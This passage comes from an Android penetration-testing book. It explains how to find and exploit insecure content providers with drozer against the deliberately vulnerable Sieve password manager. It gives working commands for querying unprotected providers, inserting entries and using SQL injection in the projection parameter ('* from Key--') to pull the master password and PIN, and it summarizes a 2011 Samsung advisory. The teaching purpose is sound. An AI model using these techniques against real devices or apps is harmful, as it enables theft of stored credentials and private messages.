was authenticated; however, it was exposed in an untrusted activity. Such flaws can often easily be exposed by
invoking activities that are not actually exported by an application. Performing an attack of this nature using an
ADB root shell was discussed earlier in this section.
Exploiting Insecure Content Providers
The security of content providers has a notorious past on Android, because they often hold an application’s most
sensitive data and many application developers have not properly secured them. These vulnerabilities were
partially because of Android’s reverse logic on content providers in regard to how they are exported by default.
Content providers were the only application component that was exported by default on Android, but this
situation has since been amended in API version 17. Note that the default behavior is still to export a content
provider if the android:targetSdkVersion is set to a value smaller than 17, and so these issues are still prevalent.
Unprotected Content Providers
A common root cause of content provider problems is the fact that they are not explicitly marked as
exported="false" in their manifest declarations because the assumption is that they follow the same default
export behavior as other components. At the time of writing, many applications still target SDK versions lower
than API 17 (which equates to Android 4.1). This means that if exported="false" is not explicitly stated on the
content provider declaration in the manifest, it is exported.
Several drozer modules help you gather information about exported content providers and then allow you to
interact with them. On the Sieve application, you can retrieve information about the content providers using the
following:
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
This reveals that two content providers don’t require any permissions for users who want to read from or write
to them. However, the DBContentProvider requires that users have permissions to read from or write to the
/Keys path.
The output of this module does not give the exact full content URIs that can be queried. However, a good
starting point would be to try the root path and defined /Keys path. For a view of all the available paths, review
the implemented query()method and peripheral source code for the content provider or use the
app.provider.finduri module in drozer. This module is not comprehensive and checks only for strings inside
that DEX file that begin with content://. This check may miss the large majority of available paths and should
not be relied upon. Running it against the Sieve package reveals the following content URIs:
dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys
In this case it did a good job of finding available content URI paths; however, you should not get into the habit
of relying solely on it. Running this module led to the discovery of a completely new path that you could not
have anticipated by observing the initial information on the content provider. The newly discovered path is
/Passwords. This does not have any permissions protecting it, and querying this URI leads to the disclosure of
all the accounts stored in this password manager. Here is the command for querying this content URI:
dz> run app.provider.query
content://com.mwr.example.sieve.DBContentProvider/Passwords
| _id | service | username | password | email |
| 1 | Gmail | tyrone | zA76WR9mURDNNEw4TUiidVKRuKLEamg5h
84T (Base64-encoded) | PI:EMAIL |
| 2 | Internet Banking | tyrone123 |
VJL7zoQdEeyeYQB2/DArlNv3G1m+fpWCEkg3TFUpUUti (Base64-encoded) |
PI:EMAIL |
This leaks all the password entries for each of the corresponding services in this content provider. The developer
of this application was clever and encrypted or obfuscated the password field. This encryption is
implementation-specific and was explicitly added by the developer. Sometimes encryption is not used at all and
access to sensitive information is obtained directly.
An interesting idea for an attacker would be to insert new entries or update existing ones in another
application’s content provider. This could open new attack avenues depending on what the application database
is used for. To insert a new entry into the content provider shown previously, you can use the app
.provider.insert module in drozer. The following code demonstrates how to add a new entry to Sieve’s
password database:
dz> run app.provider.insert content://com.mwr.example.sieve
.DBContentProvider/Passwords --integer _id 3
--string service Facebook --string username tyrone
--string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T
--string email PI:EMAIL
Done.
The Facebook service is now added using the app.provider.insert command and was added with the same
password as the Gmail service (whatever that may be).
NOTE
Android versions after and including 4.1.1 Jelly Bean contain a script that can be used to interact with
content providers located at /system/bin/content. The following example uses it in the same manner as
drozer to query the exposed content provider:
shell@android:/ $ content query --uri content://com.mwr.example.sieve.DB
ContentProvider/Passwords
Row: 0 _id=1, service=Gmail, username=tyrone, password=BLOB, email=tyron
PI:EMAIL
Row: 1 _id=2, service=Internet Banking, username=tyrone123, password=BLO
B, email=PI:EMAIL
This can be run only from an ADB shell and not inside an application because it is protected by the
android.permission.ACCESS_CONTENT_PROVIDERS_EXTERNALLY permission, which has a protection level of
signature defined by the android package.
All content providers whether they are exported or not can be queried from a privileged context. To find content
providers inside the default Android Clock package that have not been exported, you can use the -u flag on
app.provider .info:
dz> run app.provider.info -a com.android.deskclock -u
Package: com.android.deskclock
Exported Providers:
Hidden Providers:
Authority: com.android.deskclock
Read Permission: null
Write Permission: null
Content Provider: com.android.deskclock.provider.ClockProvider
Multiprocess Allowed: False
Grant Uri Permissions: False
Confirming this in the application manifest reveals that this content provider is explicitly not exported.
Attempting to query this content provider from drozer results in an error saying that it is not exported.
dz> run app.provider.query content://com.android.deskclock/alarms/
Permission Denial: opening provider com.android.deskclock.provider.Clock
Provider from ProcessRecord{b2084228 1741:com.mwr.dz:remote/u0a64}
(pid=1741, uid=10064) that is not exported from uid 10020
However, querying the same content provider from a root ADB shell is successful.
root@generic:/ # content query --uri content://com.android.deskclock/ala
rms/
Row: 0 _id=1, hour=8, minutes=30, daysofweek=31, enabled=0, vibrate=0, l
abel=, ringtone=NULL, delete_after_use=0
Row: 1 _id=2, hour=9, minutes=0, daysofweek=96, enabled=0, vibrate=0, la
bel=, ringtone=NULL, delete_after_use=0
The attack vector in this case may be limited but it may be interesting to know.
SQL Injection
A commonly implemented technique with content providers is to connect them directly with an SQLite
database. This makes sense because the structures and methods used on content providers—with methods like
insert, update, delete, and query (which may be akin to select statements)—feel very similar to SQL’s. If you are
familiar with finding vulnerabilities in web applications, you may immediately know what is coming. If input
into a content provider that is backed by an SQLite database is not sanitized or white-listed appropriately, then it
may be vulnerable to SQL injection—injecting arbitrary SQL commands in a variable that is used inside a SQL
statement. In the following code, examine the arguments of a query method on a content provider:
final Cursor query(
Uri uri,
String[] projection,
String selection,
String[] selectionArgs,
String sortOrder);
The uri is the full path of the content URI being queried. The following format is expected of a content URI:
content://authority/path.
The rest of the parameters can be better explained by using them inside a SQL query:
select projection from table_name(uri) where selection=selectionArgs ord
er by sortOrder
This means that the following arguments in the query method may result in the following SQL query:
final Cursor query(
Uri.parse("content://settings/system"),
null,
null,
null,
null);
Query: select * from system
Attempting a SQL injection attack in the projection parameter looks as follows:
final Cursor query(
Uri.parse("content://settings/system"),
new String[] {"* from sqlite_master--"},
null,
null,
null);
Query: select * from sqlite_master--* from system
The dash characters appended to the projection ensure that the rest of the query is commented out and a valid
query is still formed by this injection. Now try to find whether a SQL injection exists in the /Passwords path in
the DBContentProvider of Sieve. First look to determine whether an injection point exists in the projection
parameter.
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProv
ider/Passwords --projection "'"
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELE
CT ' FROM Passwords
Injecting a single quote into the projection causes an error in the structure of the query that SQLite received.
You can now use this injection point to find all the tables available in the same SQLite database by using a
projection of * from sqlite_master where type='table'--. This is shown in the following code snippet:
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProv
ider/Passwords --projection "* from sqlite_master where type='table'--"
| type | name | tbl_name | rootpage | sql |
| table | android_metadata | android_metadata | 3 | CREATE TABLE
android_metadata (locale TEXT) |
| table | Passwords | Passwords | 4 | CREATE TABLE
Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password
BLOB,email ) |
| table | Key | Key | 5 | CREATE TABLE
Key (Password TEXT PRIMARY KEY,pin TEXT )
Any one of the available tables can now be queried. Remember the /Keys path that required a permission in
order to read? The associated “Key” table can now be extracted using the injection point:
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProv
ider/Passwords --projection "* from Key--"
| Password | pin |
| Thisismylongpassword123 | 1234 |
This shows a complete compromise of the password manager’s master password and pin used to protect the
data. This is an old web vulnerability that now can exist in Android applications implementing content
providers.
You can automate the detection of SQL injection vulnerabilities using drozer in conjunction with the
scanner.provider.injection module.
dz> run scanner.provider.injection -a content://com.mwr.example.sieve.DB
ContentProvider/Passwords
...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Passwords
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Passwords
You can also automatically find the available tables to query in drozer.
dz> run scanner.provider.sqltables -a content://com.mwr.example.sieve.DB
ContentProvider/Passwords
Accessible tables for uri content://com.mwr.example.sieve.DBContentProvi
der/Passwords:
android_metadata
Passwords
Key
NOTE
You can also use these modules with a -a option that allows you to provide the package name and not a
content URI. However, this simply uses the finduri method explained earlier to find content URIs and
then tries SQL injection against discovered paths. This is not recommended if you are performing a
comprehensive assessment of an application as there are known pitfalls with the finduri method that was
explained earlier.
USING EXISTING TOOLS TO FIND SQL INJECTION
Mapping content providers to a web interface is also possible by using a module in drozer at
auxiliary.webcontentresolver. This essentially allows you to use existing established tools like sqlmap
(see http://sqlmap.org/) to exploit content providers. To start this module, run it with the specified port
that it must bind a web server to:
dz> run auxiliary.webcontentresolver -p 9999
WebContentResolver started on port 9999.
Ctrl+C to Stop
Now browsing to http://localhost:9999 will show all content providers on the device as well as some
information about them. You can target and exploit specific content providers through this web interface
in the same way as SQL injection would be tested in a normal web application. Browsing to the following
address returns the same SQL injection message presented earlier in this section:
http://localhost:9999/query?
uri=content://com.mwr.example.sieve.DBContentProvider/Passwords&projection=%27&selection=&selectionSort=
Figure 7.9 shows the returned output.
Figure 7.9 Finding SQL injection using drozer’s WebContentResolver web interface
REAL-WORLD EXAMPLE: MULTIPLE SAMSUNG (ANDROID) APPLICATION
VULNERABILITIES
On December 13, 2011, Tyrone Erasmus and Michael Auty from MWR InfoSecurity issued an advisory
containing a number of content provider vulnerabilities in pre-installed applications on Samsung devices.
These issues allowed the retrieval of the following content from a completely unprivileged application:
Email address
Email password
Email contents
Instant messages
Instant messaging contacts
Social networking messages
SMS messages
Call logs
GPS location
Notes from various applications
Portable Wi-Fi hotspot credentials
These were discovered by examining all content providers of the pre-installed applications on the device.
All of this information could be retrieved because the content providers did not enforce a read permission
in their manifest files. A SQL injection vulnerability was also discovered in the
com.android.providers.telephony package that allowed the retrieval of all SMS messages. This was
possible because Samsung modified this package to include a content provider with a content URI of
content://channels that shared the same SQLite database with the content://sms content provider. The
channels content provider did not require any permissions and contained a SQL injection vulnerability.
The steps of exploiting this SQL injection are detailed here.
Using drozer shows the content providers inside the com.android.providers .telephony package:
dz> run app.provider.info -a com.android.providers.telephony
Package: com.android.providers.telephony
Authority: telephony
Read Permission: null
Write Permission: null
Content Provider: com.android.providers.telephony.TelephonyProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Authority: nwkinfo
Read Permission: null
Write Permission: null